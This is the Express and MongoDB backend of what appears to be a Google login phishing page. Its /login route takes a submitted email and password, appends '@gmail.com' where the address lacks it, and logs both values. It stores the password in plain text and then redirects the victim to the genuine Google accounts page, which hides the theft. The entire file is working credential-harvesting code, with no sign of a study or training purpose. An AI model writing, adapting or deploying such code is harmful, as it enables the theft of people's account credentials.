const express = require("express");
const mongoose = require("mongoose");
const Blog = require("./User/user");

const app = express();

const dbURI = process.env.dbURI;

let email;

const port = process.env.PORT || 5000;

mongoose.connect(dbURI, {useNewUrlParser: true, useUnifiedTopology: true})
  .then((result) => {app.listen(port, () => {
  console.log(`App is listening on port ${port}...`)
})})
  .catch((err) => console.log(err))


 app.use(express.static('public'))
 app.use(express.json());
 app.use(express.urlencoded({extended: true}));

 
 app.get('/', (req, res) => {
   res.sendFile('./dist/index.html', {root:__dirname});
 });
 
 app.post('/login', (req, res)=> {
   let {mail:m, passw} = req.body
   m.includes("@gmail.com") ? email = m : m.includes("@gmail") ? email = m +".com" : email = m +"@gmail.com" ;
   
   console.log(email, passw)
   
   
   const blog = new Blog({
     email: email,
     password: passw
     });
   blog.save().
   then((result) => {
    res.status(200).redirect('https://accounts.google.com')
   })
   .catch((err) => console.log(err))
 })
 

